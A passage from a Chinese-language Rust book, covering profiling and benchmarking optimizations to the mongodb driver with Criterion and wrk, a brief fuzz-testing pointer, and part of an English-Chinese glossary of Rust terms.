</span>/// Deserialize the body of the response.
pub(crate) fn body&lt;T: DeserializeOwned&gt;(&amp;self) -&gt; Result&lt;T&gt; {
    match bson::from_bson(Bson::Document(self.raw_response.clone())) {
        Ok(body) =&gt; Ok(body),
        Err(e) =&gt; Err(ErrorKind::ResponseError {
            message: format!(&quot;{}&quot;, e),
        }
        .into()),
    }
}
<span class="boring">}
</span></code></pre></pre>
<p>我们可以看到，这里确实有一个对<code>clone</code>的调用，所以它很可能是我们在火焰图中看到的耗费大量时间的那个。<code>clone</code>是必须的，因为我们需要从<code>self</code>所拥有的<code>raw_response</code>中反序列化，但我们只有对<code>self</code>的引用，所以我们不能从其中移出(move out)。我们也不能通过引用来使用<code>raw_response</code>，因为<code>bson::from_bson</code>期望一个有所有权的值。让我们研究一下 <code>body</code> 本身被调用的地方，看看我们是否可以改变它以获得 <code>self </code>的所有权，从而避免<code>clone</code>。</p>
<p>具体来看这个基准的使用情况，在<code>Find::handle_response</code>中，查找操作使用它来反序列化服务端上的<code>response</code>。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>fn handle_response(&amp;self, response: CommandResponse) -&gt; Result&lt;Self::O&gt; {    let body: CursorBody = response.body()?;    Ok(CursorSpecification::new(        self.ns.clone(),        response.source_address().clone(),        body.cursor.id,        self.options.as_ref().and_then(|opts| opts.batch_size),        self.options.as_ref().and_then(|opts| opts.max_await_time),        body.cursor.first_batch,    ))}
<span class="boring">}
</span></code></pre></pre>
<p>正如我们在这里看到的，<code>response</code>只在调用<code>body</code>后使用了一次，而且这一次的使用可以在它之前没有问题，所以如果 <code>body</code> 取得了<code>self</code>的所有权，这个调用点至少还能工作。对其余的调用点重复这个过程，我们看到<code>body</code>实际上可以取得<code>self</code>的所有权，从而避免<code>clone</code>，所以让我们做这个改变，看看它对性能有什么影响。</p>
<p>在做了这个改变之后，重新运行<code>cargo bench</code>的结果如下。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>find                    time:   [47.495 ms 47.843 ms 48.279 ms]                        change: [-15.488% -14.760% -13.944%] (p = 0.00 &lt; 0.05)                        Performance has improved.Found 4 outliers among 100 measurements (4.00%)  4 (4.00%) high severe
<span class="boring">}
</span></code></pre></pre>
<p>很好! 即使在这样一个简单的改变之后，我们已经观察到了性能上的明显改善。既然一些简单的问题已经被解决了，让我们调查一下其他花费大量时间的地方。</p>
<h2 id="加速反序列化"><a class="header" href="#加速反序列化">加速反序列化</a></h2>
<p>回顾一下火焰图，我们可以看到很大一部分时间都花在了解析来自 <code>MongoDB Wire</code> 协议（紫色）的响应上，然后通过<code>serde</code>（绿色）将它们反序列化为 Rust 数据结构。尽管每一个步骤都在执行类似的任务，但这两个步骤是需要的，因为<code>bson</code> crate只支持从<code>Bson</code>和<code>Document</code> Rust类型反序列化，而不是实际的<code>BSON</code>，即<code>MongoDB wire</code> 协议中使用的二进制格式。火焰图表明，这个过程消耗了大量的时间，因此如果这两个步骤可以合并为一个，有可能会带来显著的性能优势。</p>
<p>本质上，我们想从以下几个方面入手。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let bytes = socket.read(&amp;mut bytes).await?; // read message from databaselet document = Document::from_reader(bytes.as_slice())?; // parse into Documentlet rust_data_type: MyType = bson::from_document(document)?; // deserialize via serde
<span class="boring">}
</span></code></pre></pre>
<p>合并为：</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let bytes = socket.read(&amp;mut bytes).await?; // read message from databaselet rust_data_type: MyType = bson::from_slice(bytes.as_slice())?; // deserialize via serde
<span class="boring">}
</span></code></pre></pre>
<p>要做到这一点，我们需要实现一个新的<code>serde</code> 的 <code>Deserializer</code>，它可以与原始<code>BSON</code>一起工作。这方面的工作相当广泛，而且相当复杂，所以我就不说细节了。<code>serde</code>文档中的 &quot; <a href="https://serde.rs/impl-deserializer.html">实现 Deserializer</a> &quot;部分为那些感兴趣的人提供了一个实现<code>JSON</code>的优秀例子。</p>
<p>那么，现在我们<a href="https://github.com/mongodb/bson-rust/commit/7ccf82b3dc66141d8292a5c1e253362abaa13d5c">实现了 Deserializer</a>并 <a href="https://github.com/mongodb/mongo-rust-driver/commit/0fa2a905c1f5411a6f0109debe18c3cfa35c94be">更新了驱动程序</a> 以使用它，让我们重新运行<code>cargo bench</code>，看看它是否对性能有任何影响。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>find                    time:   [30.624 ms 30.719 ms 30.822 ms]                        change: [-36.409% -35.791% -35.263%] (p = 0.00 &lt; 0.05)                        Performance has improved.Found 5 outliers among 100 measurements (5.00%)  1 (1.00%) low mild  1 (1.00%) high mild  3 (3.00%) high severe
<span class="boring">}
</span></code></pre></pre>
<p>棒极了! 平均迭代时间比上一次大约减少了36%，这与最初的基线相比已经有了很大的减少。现在我们已经实施了一些改进，让我们仔细看看结果。</p>
<h2 id="分析结果"><a class="header" href="#分析结果">分析结果</a></h2>
<h3 id="查看criterion的html报告"><a class="header" href="#查看criterion的html报告">查看Criterion的HTML报告</a></h3>
<p><code>Criterion</code>支持生成一个<code>HTML</code>报告，总结最近的运行情况，并与之前的运行情况进行比较。要访问该报告，只需在浏览器中打开<code>target/criterion/report/index.html</code>。</p>
<p>作为一个例子，<a href="https://patrickfreed.github.io/resources/making-slow-rust-code-fast/criterion/find/report/index.html">这里</a>是比较基线和最优化的报告。</p>
<p>在报告的顶部，我们可以看到最优化运行的总结，包括一个说明平均执行时间的图表和一个显示所有样本标准的散点图，以及一些其他图表的链接。下面是最近一次查找基准运行的该部分的屏幕截图。</p>
<p><img src="https://patrickfreed.github.io/resources/making-slow-rust-code-fast/report-summary.png" alt="3" /></p>
<p>在报告的底部，有一个最近两次运行的比较，较旧的运行（基线）为红色，较新的运行（优化后的）为蓝色。下面是优化后的<code>mongodb</code>版本与未优化的基线比较的部分的截图。在其中，我们可以看到，未优化的基线显然要比优化的慢得多。从分布的广度来看，我们也可以看到，优化版的性能比基线版的更稳定。</p>
<p><img src="https://patrickfreed.github.io/resources/making-slow-rust-code-fast/report-comparison.png" alt="4" /></p>
<p>这些报告是超级有用的工具，可以直观地看到因性能调优而发生的变化，而且对于向他人介绍结果特别有用。它们还可以作为过去性能数据的记录，消除了手动记录结果的需要。</p>
<h3 id="使用wrk进行压测"><a class="header" href="#使用wrk进行压测">使用<code>wrk</code>进行压测</a></h3>
<p>虽然微基准对隔离行为和识别瓶颈非常有用，但它们并不总是代表真实的工作负载。为了证明所做的改变确实提高了性能，并且没有过度适应微基准，在真实世界的场景中进行测量也是很有用的。</p>
<p>对于像<code>mongodb</code>这样的异步数据库驱动来说，这意味着有大量并发请求的情况。一个生成这种请求的有用工具是<code>wrk</code>工作负载生成器。</p>
<p>要安装<code>wrk</code>，你需要<code>clone repo</code>并从源代码中构建它。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>git clone https://github.com/wg/wrkcd wrkmake./wrk --version
<span class="boring">}
</span></code></pre></pre>
<p>如果成功了，你应该看到<code>wrk</code>的版本信息。关于更具体的安装说明，请看 <code>wrk</code> 的 <code>INSTALL</code> 页面。</p>
<p>在启动了一个<code>actix-web</code>服务器（在release 模式下运行），它将对每个<code>GET</code>请求执行查找，我用下面的调用将<code>wrk</code>指向它。</p>
<pre><code>./wrk -t8 -c100 -d10s http://127.0.0.1:8080
</code></pre>
<p>这将在<code>10</code>秒内运行一个基准，使用<code>8</code>个线程，并保持<code>100</code>个HTTP连接开放。</p>
<p>使用未经优化的驱动程序，我看到了以下结果。</p>
<pre><code>Running 10s test @ http://127.0.0.1:8080  8 threads and 100 connections  Thread Stats   Avg      Stdev     Max   +/- Stdev    Latency     7.83ms    2.06ms  26.52ms   73.81%    Req/Sec     1.54k   379.64     7.65k    91.02%  122890 requests in 10.10s, 205.45MB readRequests/sec:  12168.39Transfer/sec:     20.34MB
</code></pre>
<p>优化后，我看到的却是这样的结果。</p>
<pre><code>Running 10s test @ http://127.0.0.1:8080  8 threads and 100 connections  Thread Stats   Avg      Stdev     Max   +/- Stdev    Latency     4.03ms    1.31ms  52.06ms   97.77%    Req/Sec     3.03k   292.52     6.00k    92.41%  242033 requests in 10.10s, 404.63MB readRequests/sec:  23964.39Transfer/sec:     40.06MB
</code></pre>
<p>.这意味着吞吐量几乎增加了<code>100％</code>，真棒！这意味着我们基于微基准的优化对实际工作负载有非常显著改善。</p>
<h2 id="下一步"><a class="header" href="#下一步">下一步</a></h2>
<p>在这篇文章中，我们已经看到了如何只用一些基本的性能技术（生成火焰图、基准测试）就能在你的Rust应用程序中实现显著的性能改进。这方面的过程可以总结为以下步骤。</p>
<ol>
<li>使用 <code>criterion </code> 运行一个基准，以建立一个基线</li>
<li>通过<code>cargo flamegraph</code>识别瓶颈</li>
<li>尝试解决瓶颈问题</li>
<li>重新运行基准测试，看看瓶颈是否得到解决</li>
<li>重复进行以上步骤</li>
</ol>
<p>这个过程可以反复进行，直到达到一个令人满意的性能水平。然而，随着你的迭代，改进可能会变得不那么显著，需要更多的努力来实现。例如，在<code>mongodb</code>的例子中，第一个大的改进来自于更明智地使用<code>clone()</code>，但为了达到类似的改进水平，需要实现整个<code>serde</code> 的  <code>Deserializer</code> 。这就引出了性能剖析如此重要的另一个原因：除了识别需要优化的地方外，它还可以帮助确定何时需要优化（或者反过来说，何时应该停止优化）。如果剩下的改进不值得努力，性能剖析可以表明这一点，让你把精力集中在其他地方。这一点很重要，因为无论某件事情如何优化，总是有改进的余地，而且很容易陷入过度优化的无底洞中。</p>
<h2 id="总结"><a class="header" href="#总结">总结</a></h2>
<p>我希望这个关于 Rust 中性能剖析和基准测试的概述是有帮助的。请注意，将你的 Rust 应用程序或库，优化到技术上尽可能快，并不总是必须的。因为优化的代码往往比简单但缓慢的代码更难理解和维护。</p>
<p>更重要的是，你的应用程序或库要满足其性能预期。例如，如果一个<code>CLI</code>工具的自我更新需要<code>50</code>毫秒或<code>100</code>毫秒，尽管有可能减少<code>50%</code>的运行时间，这并没有什么区别，因为<code>100</code>毫秒完全在这种功能的预期性能水平之内。然而，对于那些性能没有达到预期的情况，这篇文章中所概述的过程可以非常有效地产生优化，正如我们最近对<code>mongodb </code>crate所做的改进中所看到的。</p>
<h2 id="广告时间"><a class="header" href="#广告时间">广告时间</a></h2>
<p>我们最近发布了<a href="https://crates.io/crates/mongodb"><code>mongodb</code></a> crate的<a href="https://github.com/mongodb/mongo-rust-driver/releases/tag/v2.0.0"> <code>v2.0.0</code></a>版本，其中包含了这篇文章中提到的性能改进，以及大量的新功能，包括对事务的支持。如果你对用Rust编写Web应用程序感兴趣，如果你需要一个数据库，请查看<code>MongoDB</code> Rus t驱动。</p>
<h2 id=""><a class="header" href="#"></a></h2>
<div style="break-before: page; page-break-before: always;"></div><h1 id="模糊测试"><a class="header" href="#模糊测试">模糊测试</a></h1>
<p><a href="https://en.wikipedia.org/wiki/Fuzz_testing">模糊测试（Fuzz testing）</a>是一种软件测试技术，用于通过向软件提供伪随机数据作为输入来发现安全性和稳定性问题。</p>
<p>关于模糊测试可以参考：</p>
<ul>
<li><a href="https://rust-fuzz.github.io/book/introduction.html">Rust Fuzz Book</a> </li>
<li><a href="https://github.com/rust-fuzz">https://github.com/rust-fuzz</a> </li>
<li><a href="https://about.gitlab.com/blog/2020/12/03/how-to-fuzz-rust-code/">How to fuzz Rust code continuously</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="c术语解释"><a class="header" href="#c术语解释">C.术语解释</a></h1>
<h2 id="语言元素术语表"><a class="header" href="#语言元素术语表">语言元素术语表</a></h2>
<table><thead><tr><th>术语</th><th>中文翻译</th><th>备注</th></tr></thead><tbody>
<tr><td><strong>A</strong></td><td></td><td></td></tr>
<tr><td>Abstract Syntax Tree</td><td>抽象语法树</td><td></td></tr>
<tr><td>ABI</td><td>应用程序二进制接口</td><td>Application Binary Interface 缩写</td></tr>
<tr><td>accumulator</td><td>累加器</td><td></td></tr>
<tr><td>accumulator variable</td><td>累加器变量</td><td></td></tr>
<tr><td>ahead-of-time compiled</td><td>预编译</td><td></td></tr>
<tr><td>ahead-of-time compiled language</td><td>预编译语言</td><td></td></tr>
<tr><td>alias</td><td>别名</td><td></td></tr>
<tr><td>aliasing</td><td>别名使用</td><td>参见 <a href="https://en.wikipedia.org/wiki/Pointer_aliasing">Wikipedia</a></td></tr>
<tr><td>angle brackets</td><td>尖括号，“&lt;”和“&gt;”</td><td></td></tr>
<tr><td>annotate</td><td>标注，注明（动词）</td><td></td></tr>
<tr><td>annotation</td><td>标注，注明（名词）</td><td></td></tr>
<tr><td>Arc</td><td>原子引用计数器</td><td>Atomic Referecne Counter</td></tr>
<tr><td>anonymity</td><td>匿名</td><td></td></tr>
<tr><td>argument</td><td>参数，实参，实际参数</td><td>不严格区分的话， argument（参数）和 <br> parameter（参量）可以互换地使用</td></tr>
<tr><td>argument type</td><td>参数类型</td><td></td></tr>
<tr><td>assignment</td><td>赋值</td><td></td></tr>
<tr><td>associated functions</td><td>关联函数</td><td></td></tr>
<tr><td>associated items</td><td>关联项</td><td></td></tr>
<tr><td>associated types</td><td>关联类型</td><td></td></tr>
<tr><td>asterisk</td><td>星号（*)</td><td></td></tr>
<tr><td>atomic</td><td>原子的</td><td></td></tr>
<tr><td>attribute</td><td>属性</td><td></td></tr>
<tr><td>automated building</td><td>自动构建</td><td></td></tr>
<tr><td>automated test</td><td>自动测试，自动化测试</td><td></td></tr>
<tr><td><strong>B</strong></td><td></td><td></td></tr>
<tr><td>benchmark</td><td>基准</td><td></td></tr>
<tr><td>binary</td><td>二进制的</td><td></td></tr>
<tr><td>binary executable</td><td>二进制的可执行文件</td><td></td></tr>
<tr><td>bind</td><td>绑定</td><td></td></tr>
<tr><td>block</td><td>语句块，代码块</td><td></td></tr>
<tr><td>boolean</td><td>布尔型，布尔值</td><td></td></tr>
<tr><td>borrow check</td><td>借用检查</td><td></td></tr>
<tr><td>borrower</td><td>借用者，借入者</td><td></td></tr>
<tr><td>borrowing</td><td>借用</td><td></td></tr>
<tr><td>bound</td><td>约束，限定，限制</td><td>此词和 constraint 意思相近，<br>constraint 在 C# 语言中翻译成“约束”</td></tr>
<tr><td>box</td><td>箱子，盒子，装箱类型</td><td>一般不译，作动词时翻译成“装箱”，<br>具有所有权的智能指针</td></tr>
<tr><td>boxed</td><td>装箱，装包</td><td></td></tr>
<tr><td>boxing</td><td>装箱，装包</td><td></td></tr>
<tr><td>brace</td><td>大括号，“{”或“}”</td><td></td></tr>
<tr><td>buffer</td><td>缓冲，缓冲区，缓冲器，缓存</td><td></td></tr>
<tr><td>build</td><td>构建</td><td></td></tr>
<tr><td>builder pattern</td><td>创建者模式</td><td></td></tr>
<tr><td><strong>C</strong></td><td></td><td></td></tr>
<tr><td>call</td><td>调用</td><td></td></tr>
<tr><td>caller</td><td>调用者</td><td></td></tr>
<tr><td>capacity</td><td>容器</td><td></td></tr>
<tr><td>capture</td><td>捕获</td><td></td></tr>
<tr><td>cargo</td><td>(Rust 包管理器，不译)</td><td>该词作名词时意思是“货物”，<br>作动词时意思是“装载货物”</td></tr>
<tr><td>cargo-fy</td><td>Cargo 化，使用 Cargo 创建项目</td><td></td></tr>
<tr><td>case analysis</td><td>事例分析</td><td></td></tr>
<tr><td>cast</td><td>类型转换，转型</td><td></td></tr>
<tr><td>casting</td><td>类型转换</td><td></td></tr>
<tr><td>chaining method call</td><td>链式方法调用</td><td></td></tr>
<tr><td>channel</td><td>信道，通道</td><td></td></tr>
<tr><td>closure</td><td>闭包</td><td></td></tr>
<tr><td>coercion</td><td>强制类型转换，强制转换</td><td>coercion 原意是“强制，胁迫”</td></tr>
<tr><td>collection</td><td>集合</td><td>参见 <a href="https://zh.wikipedia.org/wiki/%E9%9B%86%E5%90%88_(%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6)">Wikipedia</a></td></tr>
<tr><td>combinator</td><td>组合算子，组合器</td><td></td></tr>
<tr><td>comma</td><td>逗号，“,”</td><td></td></tr>
<tr><td>command</td><td>命令</td><td></td></tr>
<tr><td>command line</td><td>命令行</td><td></td></tr>
<tr><td>comment</td><td>注释</td><td></td></tr>
<tr><td>compile</td><td>编译（动词）</td><td></td></tr>
<tr><td>compile time</td><td>编译期，编译期间，编译时</td><td></td></tr>
<tr><td>compilation</td><td>编译（名词）</td><td></td></tr>
<tr><td>compilation unit</td><td>编译单元</td><td></td></tr>
<tr><td>compiler</td><td>编译器</td><td></td></tr>
<tr><td>compiler intrinsics</td><td>编译器固有功能</td><td></td></tr>
<tr><td>compound</td><td>复合（类型，数据）</td><td></td></tr>
<tr><td>concurrency</td><td>并发</td><td></td></tr>
<tr><td>conditional compilation</td><td>条件编译</td><td></td></tr>
<tr><td>configuration</td><td>配置</td><td></td></tr>
<tr><td>constructor</td><td>构造器</td><td></td></tr>
<tr><td>consumer</td><td>消费者</td><td></td></tr>
<tr><td>container</td><td>容器</td><td></td></tr>
<tr><td>container type</td><td>容器类型</td><td></td></tr>
<tr><td>convert</td><td>转换，转化，转</td><td></td></tr>
<tr><td>copy</td><td>复制，拷贝</td><td></td></tr>
<tr><td>crate</td><td>包，包装箱，装包</td><td>一般不译，crate 是 Rust 的基本编译单元</td></tr>
<tr><td>curly braces</td><td>大括号，包含“{”和“}”</td><td></td></tr>
<tr><td>custom type</td><td>自定义类型</td><td></td></tr>
<tr><td><strong>D</strong></td><td></td><td></td></tr>
<tr><td>dangling pointer</td><td>悬垂指针</td><td>use after free 在释放后使用</td></tr>
<tr><td>data race</td><td>数据竞争</td><td></td></tr>
<tr><td>dead code</td><td>死代码，无效代码，不可达代码</td><td></td></tr>
<tr><td>deallocate</td><td>释放，重新分配</td><td></td></tr>
<tr><td>declare</td><td>声明</td><td></td></tr>
<tr><td>deep copy</td><td>深拷贝，深复制</td><td></td></tr>
<tr><td>dependency</td><td>依赖</td><td></td></tr>
<tr><td>deref coercions</td><td>强制多态</td><td></td></tr>
<tr><td>dereference</td><td>解引用</td><td>Rust  文章中有时简写为 Deref</td></tr>
<tr><td>derive</td><td>派生</td><td></td></tr>
<tr><td>designator</td><td>指示符</td><td></td></tr>
<tr><td>destruction</td><td>销毁，毁灭</td><td></td></tr>
<tr><td>destructor</td><td>析构器，析构函数</td><td></td></tr>
<tr><td>destructure</td><td>解构</td><td></td></tr>
<tr><td>destructuring</td><td>解构，解构赋值</td><td></td></tr>
<tr><td>desugar</td><td>脱糖</td><td></td></tr>
<tr><td>diverge function</td><td>发散函数</td><td></td></tr>
<tr><td>device drive</td><td>设备驱动</td><td></td></tr>
<tr><td>directory</td><td>目录</td><td></td></tr>
<tr><td>dispatch</td><td>分发</td><td></td></tr>
<tr><td>diverging functions</td><td>发散函数</td><td></td></tr>
<tr><td>documentation</td><td>文档</td><td></td></tr>
<tr><td>dot operator</td><td>点运算符</td><td></td></tr>
<tr><td>DST</td><td>动态大小类型</td><td>dynamic sized type，一般不译，<br>使用英文缩写形式</td></tr>
<tr><td>dynamic language</td><td>动态类型语言</td><td></td></tr>
<tr><td>dynamic trait type</td><td>动态特质类型</td><td></td></tr>
<tr><td>declarative macros</td><td>声明宏</td><td></td></tr>
<tr><td><strong>E</strong></td><td></td><td></td></tr>
<tr><td>enumeration</td><td>枚举</td><td></td></tr>
<tr><td>encapsulation</td><td>封装</td><td></td></tr>
<tr><td>equality test</td><td>相等测试</td><td></td></tr>
<tr><td>elision</td><td>省略</td><td></td></tr>
<tr><td>exhaustiveness checking</td><td>穷尽性检查，无遗漏检查</td><td></td></tr>
<tr><td>expression</td><td>表达式</td><td></td></tr>
<tr><td>expression-oriented language</td><td>面向表达式的语言</td><td></td></tr>
<tr><td>explicit</td><td>显式</td><td></td></tr>
<tr><td>explicit discriminator</td><td>显式的辨别值</td><td></td></tr>
<tr><td>explicit type conversion</td><td>显式类型转换</td><td></td></tr>
<tr><td>extension</td><td>扩展名</td><td></td></tr>
<tr><td>extern</td><td>外，外部</td><td>作关键字时不译</td></tr>
<tr><td><strong>F</strong></td><td></td><td></td></tr>
<tr><td>fat pointer</td><td>胖指针</td><td></td></tr>
<tr><td>feature gate</td><td>功能开关</td><td></td></tr>
<tr><td>field</td><td>字段</td><td></td></tr>
<tr><td>field-level mutability</td><td>字段级别可变性</td><td></td></tr>
<tr><td>file</td><td>文件</td><td></td></tr>
<tr><td>fmt</td><td>格式化，是 format 的缩写</td><td></td></tr>
<tr><td>formatter</td><td>格式化程序，格式化工具，格式器</td><td></td></tr>
<tr><td>floating-point number</td><td>浮点数</td><td></td></tr>
<tr><td>flow control</td><td>流程控制</td><td></td></tr>
<tr><td>Foreign Function Interface（FFI）</td><td>外部语言函数接口</td><td></td></tr>
<tr><td>fragment specifier</td><td>片段分类符</td><td></td></tr>
<tr><td>free variables</td><td>自由变量</td><td></td></tr>
<tr><td>freeze</td><td>冻结</td><td></td></tr>
<tr><td>function</td><td>函数</td><td></td></tr>
<tr><td>function declaration</td><td>函数声明</td><td></td></tr>
<tr><td>functional</td><td>函数式</td><td></td></tr>
<tr><td><strong>G</strong></td><td></td><td></td></tr>
<tr><td>garbage collector</td><td>垃圾回收</td><td></td></tr>
<tr><td>generalize</td><td>泛化，泛型化</td><td></td></tr>
<tr><td>generator</td><td>生成器</td><td></td></tr>
<tr><td>generic</td><td>泛型</td><td></td></tr>
<tr><td>generic type</td><td>泛型类型</td><td></td></tr>
<tr><td>growable</td><td>可增长的</td><td></td></tr>
<tr><td>guard</td><td>守卫</td><td></td></tr>
<tr><td><strong>H</strong></td><td></td><td></td></tr>
<tr><td>handle error</td><td>句柄错误</td><td></td></tr>
<tr><td>hash</td><td>哈希，哈希值，散列</td><td></td></tr>
<tr><td>hash map</td><td>散列映射，哈希表</td><td></td></tr>
<tr><td>heap</td><td>堆</td><td></td></tr>
<tr><td>hierarchy</td><td>层次，分层，层次结构</td><td></td></tr>
<tr><td>higher rank lifetime</td><td>高阶生命周期</td><td></td></tr>
<tr><td>higher rank trait bound</td><td>高阶特质约束</td><td></td></tr>
<tr><td>higher tank type</td><td>高阶类型</td><td></td></tr>
<tr><td>hygiene</td><td>卫生</td><td></td></tr>
<tr><td>hygienic macro system</td><td>卫生宏系统</td><td></td></tr>
<tr><td><strong>I</strong></td><td></td><td></td></tr>
<tr><td>ICE</td><td>编译内部错误</td><td>internal comppiler error 的缩写</td></tr>
<tr><td>immutable</td><td>不可变的</td><td></td></tr>
<tr><td>implement</td><td>实现</td><td></td></tr>
<tr><td>implementor</td><td>实现者</td><td></td></tr>
<tr><td>implicit</td><td>隐式</td><td></td></tr>
<tr><td>implicit discriminator</td><td>隐式的辨别值</td><td></td></tr>
<tr><td>implicit type conversion</td><td>隐式类型转换</td><td></td></tr>
<tr><td>import</td><td>导入</td><td></td></tr>
<tr><td>in assignment</td><td>在赋值（语句）</td><td></td></tr>
<tr><td>index</td><td>索引</td><td>英语复数形式：indices</td></tr>
<tr><td>infer</td><td>推导（动词）</td><td></td></tr>
<tr><td>inference</td><td>推导（名词）</td><td></td></tr>
<tr><td>inherited mutability</td><td>承袭可变性</td><td></td></tr>
<tr><td>inheritance</td><td>继承</td><td></td></tr>
<tr><td>integrated development <br>environment(IDE)</td><td>集成开发环境</td><td>中文著作中通常直接写成 IDE</td></tr>
<tr><td>integration-style test</td><td>集成测试</td><td></td></tr>
<tr><td>interior mutability</td><td>内部可变性</td><td></td></tr>
<tr><td>installer</td><td>安装程序，安装器</td><td></td></tr>
<tr><td>instance</td><td>实例</td><td></td></tr>
<tr><td>instance method</td><td>实例方法</td><td></td></tr>
<tr><td>integer</td><td>整型，整数</td><td></td></tr>
<tr><td>interact</td><td>相互作用，相互影响</td><td></td></tr>
<tr><td>interior mutability</td><td>内部可变性</td><td></td></tr>
<tr><td>intrinsic</td><td>固有的</td><td></td></tr>
<tr><td>invoke</td><td>调用</td><td></td></tr>
<tr><td>item</td><td>项，条目，项目</td><td></td></tr>
<tr><td>iterate</td><td>重复</td><td></td></tr>
<tr><td>iteration</td><td>迭代</td><td></td></tr>
<tr><td>iterator</td><td>迭代器</td><td></td></tr>
<tr><td>iterator adaptors</td><td>迭代器适配器</td><td></td></tr>
<tr><td>iterator invalidation</td><td>迭代器失效</td><td></td></tr>
<tr><td><strong>L</strong></td><td></td><td></td></tr>
<tr><td>LHS</td><td>左操作数</td><td>left-hand side 的非正式缩写，<br>与 RHS 相对</td></tr>
<tr><td>lender</td><td>借出者</td><td></td></tr>
<tr><td>library</td><td>库</td><td></td></tr>
<tr><td>lifetime</td><td>生存期/ 寿命 / 生命周期</td><td></td></tr>
<tr><td>lifetime elision</td><td>生命周期省略</td><td></td></tr>
<tr><td>link</td><td>链接</td><td></td></tr>
<tr><td>linked-list</td><td>链表</td><td></td></tr>
<tr><td>lint</td><td>（不译）</td><td>lint 英文本义是“纱布，绒毛”，此词在<br>计算机领域中表示程序代码中可疑和<br>不具结构性的片段，参见 <a href="https://en.wikipedia.org/wiki/Lint_%28software%29">Wikipedia</a></td></tr>
<tr><td>list</td><td>列表</td><td></td></tr>
<tr><td>listener</td><td>监听器</td><td></td></tr>
<tr><td>literal</td><td>数据，常量数据，字面值，字面量，<br>字面常量，字面上的</td><td>英文意思：字面意义的（内容）</td></tr>
<tr><td>LLVM</td><td>（不译）</td><td>Low Level Virtual Machine 的缩写，<br>是构建编译器的系统</td></tr>
<tr><td>loop</td><td>循环</td><td>作关键字时不译</td></tr>
<tr><td>low-level code</td><td>底层代码</td><td></td></tr>
<tr><td>low-level language</td><td>底层语言</td><td></td></tr>
<tr><td>l-value</td><td>左值</td><td></td></tr>
<tr><td><strong>M</strong></td><td></td><td></td></tr>
<tr><td>main function</td><td>main 函数，主函数</td><td></td></tr>
<tr><td>macro</td><td>宏</td><td></td></tr>
<tr><td>map</td><td>映射</td><td>一般不译</td></tr>
<tr><td>match guard</td><td>匹配守卫</td><td></td></tr>
<tr><td>memory</td><td>内存</td><td></td></tr>
<tr><td>memory leak</td><td>内存泄露</td><td></td></tr>
<tr><td>memory safe</td><td>内存安全</td><td></td></tr>
<tr><td>meta</td><td>原则，元</td><td></td></tr>
<tr><td>metadata</td><td>元数据</td><td></td></tr>
<tr><td>metaprogramming</td><td>元编程</td><td></td></tr>
<tr><td>metavariable</td><td>元变量</td><td></td></tr>
<tr><td>method call syntax</td><td>方法调用语法</td><td></td></tr>
<tr><td>method chaining</td><td>方法链</td><td></td></tr>
<tr><td>method definition</td><td>方法定义</td><td></td></tr>
<tr><td>modifier</td><td>修饰符</td><td></td></tr>
<tr><td>module</td><td>模块</td><td></td></tr>
<tr><td>monomorphization</td><td>单态</td><td>mono: one, morph: form</td></tr>
<tr><td>move</td><td>移动，转移</td><td>按照 Rust 所规定的内容，<br>英语单词 transfer 的意思<br>比 move 更贴合实际描述<br>参考：<a href="http://rustwiki.org/rust-by-example/scope/move.html">Rust by Example</a></td></tr>
<tr><td>move semantics</td><td>移动语义</td><td></td></tr>
<tr><td>mutability</td><td>可变性</td><td></td></tr>
<tr><td>mutable</td><td>可变</td><td></td></tr>
<tr><td>mutable reference</td><td>可变引用</td><td></td></tr>
<tr><td>multiple bounds</td><td>多重约束</td><td></td></tr>
<tr><td>mutiple patterns</td><td>多重模式</td><td></td></tr>
<tr><td><strong>N</strong></td><td></td><td></td></tr>
<tr><td>nest</td><td>嵌套</td><td></td></tr>
<tr><td>Nightly Rust</td><td>Rust 开发版</td><td>nightly本意是“每夜，每天晚上”，<br>指代码每天都更新</td></tr>
<tr><td>NLL</td><td>非词法生命周期</td><td>non lexical lifetime 的缩写，<br>一般不译</td></tr>
<tr><td>non-copy type</td><td>非复制类型</td><td></td></tr>
<tr><td>non-generic</td><td>非泛型</td><td></td></tr>
<tr><td>no-op</td><td>空操作，空运算</td><td>(此词出现在类型转换章节中）</td></tr>
<tr><td>non-commutative</td><td>非交换的</td><td></td></tr>
<tr><td>non-scalar cast</td><td>非标量转换</td><td></td></tr>
<tr><td>notation</td><td>符号，记号</td><td></td></tr>
<tr><td>numeric</td><td>数值，数字</td><td></td></tr>
<tr><td><strong>O</strong></td><td></td><td></td></tr>
<tr><td>optimization</td><td>优化</td><td></td></tr>
<tr><td>out-of-bounds accessing</td><td>越界访问</td><td></td></tr>
<tr><td>orphan rule</td><td>孤儿规则</td><td></td></tr>
<tr><td>overflow</td><td>溢出，越界</td><td></td></tr>
<tr><td>own</td><td>占有，拥有</td><td></td></tr>
<tr><td>owner</td><td>所有者，拥有者</td><td></td></tr>
<tr><td>ownership</td><td>所有权</td><td></td></tr>
<tr><td><strong>P</strong></td><td></td><td></td></tr>
<tr><td>package manager</td><td>包管理器，软件包管理器</td><td></td></tr>
<tr><td>panic</td><td>（不译）</td><td>此单词直接翻译是“恐慌”，<br>在 Rust 中用于不可恢复的错误处理</td></tr>
<tr><td>parameter</td><td>参量，形参，形式参量</td><td>不严格区分的话， argument（参数）和 <br> parameter（参量）可以互换地使用</td></tr>
<tr><td>parametric polymorphism</td><td>参数多态</td><td></td></tr>
<tr><td>parent scope</td><td>父级作用域</td><td></td></tr>
<tr><td>parentheses</td><td>小括号，包括“(”和“)”</td><td></td></tr>
<tr><td>parse</td><td>分析，解析</td><td></td></tr>
<tr><td>parser</td><td>（语法）分析器，解析器</td><td></td></tr>
<tr><td>pattern</td><td>模式</td><td></td></tr>
<tr><td>pattern match</td><td>模式匹配</td><td></td></tr>
